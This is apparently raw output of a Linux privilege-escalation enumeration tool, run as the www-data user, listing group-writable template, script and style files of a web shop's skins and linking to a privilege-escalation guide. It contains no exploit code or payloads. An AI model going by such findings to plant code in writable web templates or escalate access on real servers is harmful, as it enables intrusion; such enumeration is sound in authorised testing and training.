+/var/www/skins/default_blue/admin/main.tpl
+/var/www/skins/default_blue/admin/memberships_pages
+/var/www/skins/default_blue/admin/memberships_pages/membership_privileges.tpl
+/var/www/skins/default_blue/admin/memberships_pages/memberships.tpl
+/var/www/skins/default_blue/admin/memberships_pages/privileges.tpl
+/var/www/skins/default_blue/admin/meta.tpl
+/var/www/skins/default_blue/admin/orders_pages
+/var/www/skins/default_blue/admin/orders_pages/cart_product_options.tpl
+/var/www/skins/default_blue/admin/orders_pages/om_products.tpl
+/var/www/skins/default_blue/admin/orders_pages/om_profiles.tpl
+/var/www/skins/default_blue/admin/orders_pages/om_summary.tpl
+/var/www/skins/default_blue/admin/orders_pages/om_totals.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/pages_pages
+/var/www/skins/default_blue/admin/pages_pages/pages.tpl
+/var/www/skins/default_blue/admin/pages_pages/pages_m_add.tpl
+/var/www/skins/default_blue/admin/pages_pages/pages_m_update.tpl
+/var/www/skins/default_blue/admin/pages_pages/pages_m_viewadded.tpl
+/var/www/skins/default_blue/admin/pages_pages/pages_search.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/payments_pages
+/var/www/skins/default_blue/admin/payments_pages/cc_processors
+/var/www/skins/default_blue/admin/payments_pages/cc_processors/2checkout.tpl
+/var/www/skins/default_blue/admin/payments_pages/cc_processors/authorizenet_aim.tpl
+/var/www/skins/default_blue/admin/payments_pages/cc_processors/cardia.tpl
+/var/www/skins/default_blue/admin/payments_pages/cc_processors/enets.tpl
+/var/www/skins/default_blue/admin/payments_pages/cc_processors/hsbc.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/payments_pages/payments.tpl
+/var/www/skins/default_blue/admin/payments_pages/payments_list.tpl
+/var/www/skins/default_blue/admin/products_pages
+/var/www/skins/default_blue/admin/products_pages/global_options.tpl
+/var/www/skins/default_blue/admin/products_pages/option_types.tpl
+/var/www/skins/default_blue/admin/products_pages/options_exceptions.tpl
+/var/www/skins/default_blue/admin/products_pages/product_features.tpl
+/var/www/skins/default_blue/admin/products_pages/product_features_vars.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/profiles_pages
+/var/www/skins/default_blue/admin/profiles_pages/multiple_profiles.tpl
+/var/www/skins/default_blue/admin/profiles_pages/profiles.tpl
+/var/www/skins/default_blue/admin/profiles_pages/profiles_account.tpl
+/var/www/skins/default_blue/admin/profiles_pages/profiles_billing.tpl
+/var/www/skins/default_blue/admin/profiles_pages/profiles_contact.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/scripts
+/var/www/skins/default_blue/admin/scripts/browser_detection.js
+/var/www/skins/default_blue/admin/scripts/fileuploader_scripts.js
+/var/www/skins/default_blue/admin/scripts/form_scripts.js
+/var/www/skins/default_blue/admin/scripts/form_scripts.tpl
+/var/www/skins/default_blue/admin/scripts/template_editor_scripts.js
+/var/www/skins/default_blue/admin/shippings_pages
+/var/www/skins/default_blue/admin/shippings_pages/rates.tpl
+/var/www/skins/default_blue/admin/shippings_pages/shipping_update.tpl
+/var/www/skins/default_blue/admin/shippings_pages/shippings.tpl
+/var/www/skins/default_blue/admin/side_boxes
+/var/www/skins/default_blue/admin/side_boxes/administration.tpl
+/var/www/skins/default_blue/admin/side_boxes/catalog.tpl
+/var/www/skins/default_blue/admin/side_boxes/cms.tpl
+/var/www/skins/default_blue/admin/side_boxes/help.tpl
+/var/www/skins/default_blue/admin/side_boxes/locations.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/sitemap_pages
+/var/www/skins/default_blue/admin/sitemap_pages/links.tpl
+/var/www/skins/default_blue/admin/sitemap_pages/sitemap.tpl
+/var/www/skins/default_blue/admin/statistics_pages
+/var/www/skins/default_blue/admin/statistics_pages/edit_report.tpl
+/var/www/skins/default_blue/admin/statistics_pages/edit_report_old.tpl
+/var/www/skins/default_blue/admin/statistics_pages/edit_table.tpl
+/var/www/skins/default_blue/admin/statistics_pages/edit_table_old.tpl
+/var/www/skins/default_blue/admin/statistics_pages/graph_bar.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/styles.css
+/var/www/skins/default_blue/admin/taxes_pages
+/var/www/skins/default_blue/admin/taxes_pages/rates.tpl
+/var/www/skins/default_blue/admin/taxes_pages/tax_update.tpl
+/var/www/skins/default_blue/admin/taxes_pages/taxes.tpl
+/var/www/skins/default_blue/admin/template_editor_pages
+/var/www/skins/default_blue/admin/template_editor_pages/chmod.tpl
+/var/www/skins/default_blue/admin/template_editor_pages/edit_file.tpl
+/var/www/skins/default_blue/admin/template_editor_pages/file_list.tpl
+/var/www/skins/default_blue/admin/template_editor_pages/template_editor.tpl
+/var/www/skins/default_blue/admin/tools_pages
+/var/www/skins/default_blue/admin/tools_pages/csv_delimiters.tpl
+/var/www/skins/default_blue/admin/tools_pages/database.tpl
+/var/www/skins/default_blue/admin/tools_pages/export_catalog.tpl
+/var/www/skins/default_blue/admin/tools_pages/export_csv_template.tpl
+/var/www/skins/default_blue/admin/tools_pages/import_catalog.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/top.tpl
+/var/www/skins/default_blue/admin/top_quick_links.tpl
+/var/www/skins/default_blue/admin/topics_pages
+/var/www/skins/default_blue/admin/topics_pages/topics.tpl
+/var/www/skins/default_blue/admin/topics_pages/topics_m_add.tpl
+/var/www/skins/default_blue/admin/topics_pages/topics_m_update.tpl
+/var/www/skins/default_blue/admin/topics_pages/topics_m_viewadded.tpl
+/var/www/skins/default_blue/admin/topics_pages/topics_select_fields.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/upgrade_center_pages
+/var/www/skins/default_blue/admin/upgrade_center_pages/upgrade_center.tpl
+/var/www/skins/default_blue/admin/welcome.tpl
+/var/www/skins/default_blue/customer
+/var/www/skins/default_blue/customer/addons
+/var/www/skins/default_blue/customer/addons/ads
+/var/www/skins/default_blue/customer/addons/ads/ad_image.tpl
+/var/www/skins/default_blue/customer/addons/ads/ads.tpl
+/var/www/skins/default_blue/customer/addons/bestsellers
+/var/www/skins/default_blue/customer/addons/bestsellers/sidebox.tpl
+/var/www/skins/default_blue/customer/addons/customers_also_bought
+/var/www/skins/default_blue/customer/addons/customers_also_bought/product_details.tpl
+/var/www/skins/default_blue/customer/addons/featured_products
+/var/www/skins/default_blue/customer/addons/featured_products/customer_categories.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers
+/var/www/skins/default_blue/customer/addons/manufacturers/manufacturer.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers/manufacturer_image.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers/manufacturers.tpl
+/var/www/skins/default_blue/customer/addons/manufacturers/sidebox_manufacturers.tpl
+/var/www/skins/default_blue/customer/addons/news_and_emails
+/var/www/skins/default_blue/customer/addons/news_and_emails/news.tpl
+/var/www/skins/default_blue/customer/addons/news_and_emails/side_boxes
+/var/www/skins/default_blue/customer/addons/news_and_emails/side_boxes/news.tpl
+/var/www/skins/default_blue/customer/addons/product_reviews
+/var/www/skins/default_blue/customer/addons/product_reviews/product_details.tpl
+/var/www/skins/default_blue/customer/addons/product_reviews/stars.tpl
+/var/www/skins/default_blue/customer/addons/related_products
+/var/www/skins/default_blue/customer/addons/related_products/customer_product_details.tpl
+/var/www/skins/default_blue/customer/addons/send_to_friend
+/var/www/skins/default_blue/customer/addons/send_to_friend/send_to_friend.tpl
+/var/www/skins/default_blue/customer/addons/wholesale_trade
+/var/www/skins/default_blue/customer/addons/wholesale_trade/customer_product_details.tpl
+/var/www/skins/default_blue/customer/auth_pages
+/var/www/skins/default_blue/customer/auth_pages/login.tpl
+/var/www/skins/default_blue/customer/auth_pages/logout.tpl
+/var/www/skins/default_blue/customer/auth_pages/recover_password.tpl
+/var/www/skins/default_blue/customer/bottom.tpl
+/var/www/skins/default_blue/customer/buttons
+/var/www/skins/default_blue/customer/buttons/add_review.tpl
+/var/www/skins/default_blue/customer/buttons/add_selected_to_cart.tpl
+/var/www/skins/default_blue/customer/buttons/add_to_cart.tpl
+/var/www/skins/default_blue/customer/buttons/add_to_wishlist.tpl
+/var/www/skins/default_blue/customer/buttons/button.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/cart_pages
+/var/www/skins/default_blue/customer/cart_pages/cart.tpl
+/var/www/skins/default_blue/customer/cart_pages/cart_product_options.tpl
+/var/www/skins/default_blue/customer/cart_pages/cart_status.tpl
+/var/www/skins/default_blue/customer/cart_pages/checkout.tpl
+/var/www/skins/default_blue/customer/cart_pages/checkout_login.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/categories_pages
+/var/www/skins/default_blue/customer/categories_pages/categories.tpl
+/var/www/skins/default_blue/customer/categories_pages/categories_dtree.tpl
+/var/www/skins/default_blue/customer/categories_pages/categories_dtree_child.tpl
+/var/www/skins/default_blue/customer/categories_pages/categories_metas.tpl
+/var/www/skins/default_blue/customer/categories_pages/categories_multicolumns.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/common_templates
+/var/www/skins/default_blue/customer/common_templates/breadcrumbs.tpl
+/var/www/skins/default_blue/customer/common_templates/fileuploader.tpl
+/var/www/skins/default_blue/customer/common_templates/greet.tpl
+/var/www/skins/default_blue/customer/common_templates/href.tpl
+/var/www/skins/default_blue/customer/common_templates/loading_box.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/content.tpl
+/var/www/skins/default_blue/customer/demo_skin_selector.tpl
+/var/www/skins/default_blue/customer/exceptions_pages
+/var/www/skins/default_blue/customer/exceptions_pages/access_denied.tpl
+/var/www/skins/default_blue/customer/exceptions_pages/exceptions_list.tpl
+/var/www/skins/default_blue/customer/exceptions_pages/no_page.tpl
+/var/www/skins/default_blue/customer/exceptions_pages/no_product.tpl
+/var/www/skins/default_blue/customer/forms_pages
+/var/www/skins/default_blue/customer/forms_pages/forms.tpl
+/var/www/skins/default_blue/customer/images
+/var/www/skins/default_blue/customer/index.tpl
+/var/www/skins/default_blue/customer/js_menu
+/var/www/skins/default_blue/customer/js_menu/JSCookMenu.js
+/var/www/skins/default_blue/customer/js_menu/menu_items.js
+/var/www/skins/default_blue/customer/js_menu/theme.css
+/var/www/skins/default_blue/customer/js_menu/theme.js
+/var/www/skins/default_blue/customer/main.tpl
+/var/www/skins/default_blue/customer/meta.tpl
+/var/www/skins/default_blue/customer/orders_pages
+/var/www/skins/default_blue/customer/orders_pages/download.tpl
+/var/www/skins/default_blue/customer/orders_pages/order_details.tpl
+/var/www/skins/default_blue/customer/orders_pages/order_status.tpl
+/var/www/skins/default_blue/customer/orders_pages/orders.tpl
+/var/www/skins/default_blue/customer/orders_pages/placing_order.tpl
+/var/www/skins/default_blue/customer/pages_pages
+/var/www/skins/default_blue/customer/pages_pages/page_details.tpl
+/var/www/skins/default_blue/customer/pages_pages/pages.tpl
+/var/www/skins/default_blue/customer/pages_pages/pages_search_results.tpl
+/var/www/skins/default_blue/customer/payments
+/var/www/skins/default_blue/customer/payments/business_check.tpl
+/var/www/skins/default_blue/customer/payments/cc.tpl
+/var/www/skins/default_blue/customer/payments/cc_outside.tpl
+/var/www/skins/default_blue/customer/payments/check.tpl
+/var/www/skins/default_blue/customer/payments/cod.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/popup_image.css
+/var/www/skins/default_blue/customer/popup_image.tpl
+/var/www/skins/default_blue/customer/products_pages
+/var/www/skins/default_blue/customer/products_pages/additional_images.tpl
+/var/www/skins/default_blue/customer/products_pages/buy_now.tpl
+/var/www/skins/default_blue/customer/products_pages/exceptions.js
+/var/www/skins/default_blue/customer/products_pages/product_details.tpl
+/var/www/skins/default_blue/customer/products_pages/product_features.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/profiles_pages
+/var/www/skins/default_blue/customer/profiles_pages/account_page.tpl
+/var/www/skins/default_blue/customer/profiles_pages/multiple_profiles.tpl
+/var/www/skins/default_blue/customer/profiles_pages/profiles.tpl
+/var/www/skins/default_blue/customer/profiles_pages/profiles_account.tpl
+/var/www/skins/default_blue/customer/profiles_pages/profiles_billing.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/scripts
+/var/www/skins/default_blue/customer/scripts/cc_validator.js
+/var/www/skins/default_blue/customer/scripts/fileuploader_scripts.js
+/var/www/skins/default_blue/customer/scripts/form_scripts.js
+/var/www/skins/default_blue/customer/scripts/form_scripts.tpl
+/var/www/skins/default_blue/customer/scripts/product_options_scripts.tpl
+/var/www/skins/default_blue/customer/search_pages
+/var/www/skins/default_blue/customer/search_pages/search.tpl
+/var/www/skins/default_blue/customer/side_boxes
+/var/www/skins/default_blue/customer/side_boxes/cart.tpl
+/var/www/skins/default_blue/customer/side_boxes/categories.tpl
+/var/www/skins/default_blue/customer/side_boxes/login.tpl
+/var/www/skins/default_blue/customer/side_boxes/logout.tpl
+/var/www/skins/default_blue/customer/side_boxes/recent_products.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/customer/sitemap_pages
+/var/www/skins/default_blue/customer/sitemap_pages/categories_tree.tpl
+/var/www/skins/default_blue/customer/sitemap_pages/sitemap.tpl
+/var/www/skins/default_blue/customer/styles.css
+/var/www/skins/default_blue/customer/top.tpl
+/var/www/skins/default_blue/customer/top_menu.tpl
+/var/www/skins/default_blue/customer/top_quick_links.tpl
+/var/www/skins/default_blue/customer/topics_pages
+/var/www/skins/default_blue/customer/topics_pages/topics.tpl
+/var/www/skins/default_blue/customer/topics_pages/topics_dtree.tpl
+/var/www/skins/default_blue/customer/topics_pages/topics_dtree_child.tpl
+/var/www/skins/default_blue/customer/topics_pages/topics_tree.tpl
+/var/www/skins/default_blue/customer/welcome.tpl
+/var/www/skins/default_blue/mail
+/var/www/skins/default_blue/mail/addons
+/var/www/skins/default_blue/mail/addons/news_and_emails
+/var/www/skins/default_blue/mail/addons/news_and_emails/newsletter_body.tpl
+/var/www/skins/default_blue/mail/addons/news_and_emails/newsletter_subj.tpl
+/var/www/skins/default_blue/mail/addons/news_and_emails/updates_subscribed.tpl
+/var/www/skins/default_blue/mail/addons/news_and_emails/updates_subscribed_subj.tpl
+/var/www/skins/default_blue/mail/addons/send_to_friend
+/var/www/skins/default_blue/mail/addons/send_to_friend/mail.tpl
+/var/www/skins/default_blue/mail/addons/send_to_friend/mail_subj.tpl
+/var/www/skins/default_blue/mail/common_templates
+/var/www/skins/default_blue/mail/common_templates/modifier.tpl
+/var/www/skins/default_blue/mail/common_templates/options_info.tpl
+/var/www/skins/default_blue/mail/common_templates/price.tpl
+/var/www/skins/default_blue/mail/forms
+/var/www/skins/default_blue/mail/forms/form_body.tpl
+/var/www/skins/default_blue/mail/forms/form_subject.tpl
+/var/www/skins/default_blue/mail/images
+/var/www/skins/default_blue/mail/letter_footer.tpl
+/var/www/skins/default_blue/mail/letter_header.tpl
+/var/www/skins/default_blue/mail/orders
+/var/www/skins/default_blue/mail/orders/edp_access.tpl
+/var/www/skins/default_blue/mail/orders/edp_access_subj.tpl
+/var/www/skins/default_blue/mail/orders/invoice.tpl
+/var/www/skins/default_blue/mail/orders/low_stock.tpl
+/var/www/skins/default_blue/mail/orders/low_stock_subj.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/mail/profiles
+/var/www/skins/default_blue/mail/profiles/activate_profile.tpl
+/var/www/skins/default_blue/mail/profiles/activate_profile_subj.tpl
+/var/www/skins/default_blue/mail/profiles/create_profile.tpl
+/var/www/skins/default_blue/mail/profiles/create_profile_subj.tpl
+/var/www/skins/default_blue/mail/profiles/membership_activation.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue
+/var/www/skins/new_vision_blue/admin
+/var/www/skins/new_vision_blue/admin/addons
+/var/www/skins/new_vision_blue/admin/addons/ads
+/var/www/skins/new_vision_blue/admin/addons/ads/ad_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/ads/ad_image.tpl
+/var/www/skins/new_vision_blue/admin/addons/ads/ads.tpl
+/var/www/skins/new_vision_blue/admin/addons/featured_products
+/var/www/skins/new_vision_blue/admin/addons/featured_products/categories.tpl
+/var/www/skins/new_vision_blue/admin/addons/manufacturers
+/var/www/skins/new_vision_blue/admin/addons/manufacturers/manufacturer_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/manufacturers/manufacturer_image.tpl
+/var/www/skins/new_vision_blue/admin/addons/manufacturers/manufacturers.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/news.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/news_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/newsletter_details.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/newsletters.tpl
+/var/www/skins/new_vision_blue/admin/addons/news_and_emails/site_subscribers.tpl
+/var/www/skins/new_vision_blue/admin/addons/product_reviews
+/var/www/skins/new_vision_blue/admin/addons/product_reviews/reviews.tpl
+/var/www/skins/new_vision_blue/admin/addons/related_products
+/var/www/skins/new_vision_blue/admin/addons/related_products/products.tpl
+/var/www/skins/new_vision_blue/admin/addons/wholesale_trade
+/var/www/skins/new_vision_blue/admin/addons/wholesale_trade/products.tpl
+/var/www/skins/new_vision_blue/admin/auth_pages
+/var/www/skins/new_vision_blue/admin/auth_pages/login.tpl
+/var/www/skins/new_vision_blue/admin/auth_pages/logout.tpl
+/var/www/skins/new_vision_blue/admin/auth_pages/recover_password.tpl
+/var/www/skins/new_vision_blue/admin/bottom.tpl
+/var/www/skins/new_vision_blue/admin/buttons
+/var/www/skins/new_vision_blue/admin/buttons/add_empty_item.tpl
+/var/www/skins/new_vision_blue/admin/buttons/add_new.tpl
+/var/www/skins/new_vision_blue/admin/buttons/add_products.tpl
+/var/www/skins/new_vision_blue/admin/buttons/button.tpl
+/var/www/skins/new_vision_blue/admin/buttons/button_popup.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/categories_pages
+/var/www/skins/new_vision_blue/admin/categories_pages/categories.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_m_add.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_m_update.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_m_viewadded.tpl
+/var/www/skins/new_vision_blue/admin/categories_pages/categories_select_fields.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/common_templates
+/var/www/skins/new_vision_blue/admin/common_templates/breadcrumbs.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/confirmation_dialog.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/confirmation_dialog_post.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/create_thumbnails.tpl
+/var/www/skins/new_vision_blue/admin/common_templates/file_browser.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/content.tpl
+/var/www/skins/new_vision_blue/admin/demo_skin_selector.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages
+/var/www/skins/new_vision_blue/admin/discounts_pages/categories_tree.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_categories.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_details.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_global.tpl
+/var/www/skins/new_vision_blue/admin/discounts_pages/discount_list.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/admin/exceptions_pages
+/var/www/skins/new_vision_blue/admin/exceptions_pages/access_denied.tpl
+/var/www/skins/new_vision_blue/admin/exceptions_pages/exceptions_list.tpl
+/var/www/skins/new_vision_blue/admin/exceptions_pages/no_page.tpl
+/var/www/skins/new_vision_blue/admin/exceptions_pages/no_product.tpl
+/var/www/skins/new_vision_blue/admin/forms_pages
+/var/www/skins/new_vision_blue/admin/forms_pages/form_elements.tpl
+/var/www/skins/new_vision_blue/admin/forms_pages/forms.tpl
+/var/www/skins/new_vision_blue/admin/html_catalog_pages
+/var/www/skins/new_vision_blue/admin/html_catalog_pages/html_catalog.tpl
+/var/www/skins/new_vision_blue/admin/images
+/var/www/skins/new_vision_blue/admin/index.tpl
+/var/www/skins/new_vision_blue/admin/js_menu
+/var/www/skins/new_vision_blue/admin/js_menu/JSCookMenu.js
+/var/www/skins/new_vision_blue/admin/js_menu/emenu.tpl
+/var/www/skins/new_vision_blue/admin/js_menu/theme.css
+/var/www/skins/new_vision_blue/admin/js_menu/theme.js
+/var/www/skins/new_vision_blue/admin/locations
+/var/www/skins/new_vision_blue/admin/locations/countries.tpl
+/var/www/skins/new_vision_blue/admin/locations/destination_update.tpl
+/var/www/skins/new_vision_blue/admin/locations/destinations.tpl
+/var/www/skins/new_vision_blue/admin/locations/states.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/currencies.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/index_page.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/languages.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/logs.tpl
+/var/www/skins/new_vision_blue/admin/look_n_feel_pages/sections.tpl
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group www-data:
+/var/www/var/compiled
+/var/www/var/compiled/customer
+/var/www/var/compiled/admin
+/var/www/var/compiled/mail
+/var/www/skins
+/var/www/skins/new_vision_blue
+/var/www/skins/new_vision_blue/customer
+/var/www/skins/new_vision_blue/customer/pages_pages
+/var/www/skins/new_vision_blue/customer/pages_pages/page_details.tpl
+/var/www/skins/new_vision_blue/customer/pages_pages/pages_search_results.tpl
+/var/www/skins/new_vision_blue/customer/pages_pages/pages.tpl
+/var/www/skins/new_vision_blue/customer/content.tpl
+/var/www/skins/new_vision_blue/customer/sitemap_pages
+/var/www/skins/new_vision_blue/customer/sitemap_pages/sitemap.tpl
+/var/www/skins/new_vision_blue/customer/sitemap_pages/categories_tree.tpl
+/var/www/skins/new_vision_blue/customer/main.tpl
+/var/www/skins/new_vision_blue/customer/profiles_pages
+/var/www/skins/new_vision_blue/customer/profiles_pages/multiple_profiles.tpl
+/var/www/skins/new_vision_blue/customer/profiles_pages/profiles.tpl
+/var/www/skins/new_vision_blue/customer/profiles_pages/profiles_contact.tpl
+/var/www/skins/new_vision_blue/customer/profiles_pages/profiles_scripts.tpl
+/var/www/skins/new_vision_blue/customer/profiles_pages/profiles_account.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/side_boxes
+/var/www/skins/new_vision_blue/customer/side_boxes/logout.tpl
+/var/www/skins/new_vision_blue/customer/side_boxes/cart.tpl
+/var/www/skins/new_vision_blue/customer/side_boxes/search.tpl
+/var/www/skins/new_vision_blue/customer/side_boxes/recent_products.tpl
+/var/www/skins/new_vision_blue/customer/side_boxes/site_info.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/addons
+/var/www/skins/new_vision_blue/customer/addons/related_products
+/var/www/skins/new_vision_blue/customer/addons/related_products/customer_product_details.tpl
+/var/www/skins/new_vision_blue/customer/addons/manufacturers
+/var/www/skins/new_vision_blue/customer/addons/manufacturers/bottom_manufacturers.tpl
+/var/www/skins/new_vision_blue/customer/addons/manufacturers/manufacturer_image.tpl
+/var/www/skins/new_vision_blue/customer/addons/manufacturers/manufacturers.tpl
+/var/www/skins/new_vision_blue/customer/addons/manufacturers/manufacturer.tpl
+/var/www/skins/new_vision_blue/customer/addons/manufacturers/sidebox_manufacturers.tpl
+/var/www/skins/new_vision_blue/customer/addons/product_reviews
+/var/www/skins/new_vision_blue/customer/addons/product_reviews/stars.tpl
+/var/www/skins/new_vision_blue/customer/addons/product_reviews/product_details.tpl
+/var/www/skins/new_vision_blue/customer/addons/news_and_emails
+/var/www/skins/new_vision_blue/customer/addons/news_and_emails/side_boxes
+/var/www/skins/new_vision_blue/customer/addons/news_and_emails/side_boxes/news.tpl
+/var/www/skins/new_vision_blue/customer/addons/news_and_emails/news.tpl
+/var/www/skins/new_vision_blue/customer/addons/featured_products
+/var/www/skins/new_vision_blue/customer/addons/featured_products/customer_categories.tpl
+/var/www/skins/new_vision_blue/customer/addons/customers_also_bought
+/var/www/skins/new_vision_blue/customer/addons/customers_also_bought/product_details.tpl
+/var/www/skins/new_vision_blue/customer/addons/send_to_friend
+/var/www/skins/new_vision_blue/customer/addons/send_to_friend/send_to_friend.tpl
+/var/www/skins/new_vision_blue/customer/addons/bestsellers
+/var/www/skins/new_vision_blue/customer/addons/bestsellers/sidebox.tpl
+/var/www/skins/new_vision_blue/customer/addons/ads
+/var/www/skins/new_vision_blue/customer/addons/ads/ad_image.tpl
+/var/www/skins/new_vision_blue/customer/addons/ads/ads.tpl
+/var/www/skins/new_vision_blue/customer/addons/wholesale_trade
+/var/www/skins/new_vision_blue/customer/addons/wholesale_trade/customer_product_details.tpl
+/var/www/skins/new_vision_blue/customer/welcome.tpl
+/var/www/skins/new_vision_blue/customer/buttons
+/var/www/skins/new_vision_blue/customer/buttons/update_profile.tpl
+/var/www/skins/new_vision_blue/customer/buttons/my_account.tpl
+/var/www/skins/new_vision_blue/customer/buttons/add_to_wishlist.tpl
+/var/www/skins/new_vision_blue/customer/buttons/continue_shopping.tpl
+/var/www/skins/new_vision_blue/customer/buttons/button_popup.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/popup_image.css
+/var/www/skins/new_vision_blue/customer/orders_pages
+/var/www/skins/new_vision_blue/customer/orders_pages/download.tpl
+/var/www/skins/new_vision_blue/customer/orders_pages/placing_order.tpl
+/var/www/skins/new_vision_blue/customer/orders_pages/orders.tpl
+/var/www/skins/new_vision_blue/customer/orders_pages/order_details.tpl
+/var/www/skins/new_vision_blue/customer/orders_pages/order_status.tpl
+/var/www/skins/new_vision_blue/customer/bottom.tpl
+/var/www/skins/new_vision_blue/customer/top_search_cart.tpl
+/var/www/skins/new_vision_blue/customer/top_quick_links.tpl
+/var/www/skins/new_vision_blue/customer/cart_pages
+/var/www/skins/new_vision_blue/customer/cart_pages/profiles.tpl
+/var/www/skins/new_vision_blue/customer/cart_pages/wishlist.tpl
+/var/www/skins/new_vision_blue/customer/cart_pages/cart_status.tpl
+/var/www/skins/new_vision_blue/customer/cart_pages/cart.tpl
+/var/www/skins/new_vision_blue/customer/cart_pages/shipping_rates.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/top_menu.tpl
+/var/www/skins/new_vision_blue/customer/top.tpl
+/var/www/skins/new_vision_blue/customer/index.tpl
+/var/www/skins/new_vision_blue/customer/payments
+/var/www/skins/new_vision_blue/customer/payments/cc_outside.tpl
+/var/www/skins/new_vision_blue/customer/payments/personal_check.tpl
+/var/www/skins/new_vision_blue/customer/payments/check.tpl
+/var/www/skins/new_vision_blue/customer/payments/business_check.tpl
+/var/www/skins/new_vision_blue/customer/payments/fax.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/styles.css
+/var/www/skins/new_vision_blue/customer/images
+/var/www/skins/new_vision_blue/customer/topics_pages
+/var/www/skins/new_vision_blue/customer/topics_pages/topics_tree.tpl
+/var/www/skins/new_vision_blue/customer/topics_pages/topics_dtree.tpl
+/var/www/skins/new_vision_blue/customer/topics_pages/topics_dtree_child.tpl
+/var/www/skins/new_vision_blue/customer/topics_pages/topics.tpl
+/var/www/skins/new_vision_blue/customer/search_pages
+/var/www/skins/new_vision_blue/customer/search_pages/search.tpl
+/var/www/skins/new_vision_blue/customer/forms_pages
+/var/www/skins/new_vision_blue/customer/forms_pages/forms.tpl
+/var/www/skins/new_vision_blue/customer/demo_skin_selector.tpl
+/var/www/skins/new_vision_blue/customer/common_templates
+/var/www/skins/new_vision_blue/customer/common_templates/fileuploader.tpl
+/var/www/skins/new_vision_blue/customer/common_templates/greet.tpl
+/var/www/skins/new_vision_blue/customer/common_templates/pagination.tpl
+/var/www/skins/new_vision_blue/customer/common_templates/loading_box.tpl
+/var/www/skins/new_vision_blue/customer/common_templates/price.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/categories_pages
+/var/www/skins/new_vision_blue/customer/categories_pages/categories_dtree_child.tpl
+/var/www/skins/new_vision_blue/customer/categories_pages/categories_metas.tpl
+/var/www/skins/new_vision_blue/customer/categories_pages/categories_multicolumns.tpl
+/var/www/skins/new_vision_blue/customer/categories_pages/category_image.tpl
+/var/www/skins/new_vision_blue/customer/categories_pages/emenu_main.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/new_vision_blue/customer/scripts
+/var/www/skins/new_vision_blue/customer/scripts/form_scripts.tpl
+/var/www/skins/new_vision_blue/customer/scripts/fileuploader_scripts.js
+/var/www/skins/new_vision_blue/customer/scripts/product_options_scripts.tpl
+/var/www/skins/new_vision_blue/customer/scripts/form_scripts.js
+/var/www/skins/new_vision_blue/customer/scripts/cc_validator.js
+/var/www/skins/new_vision_blue/customer/js_menu
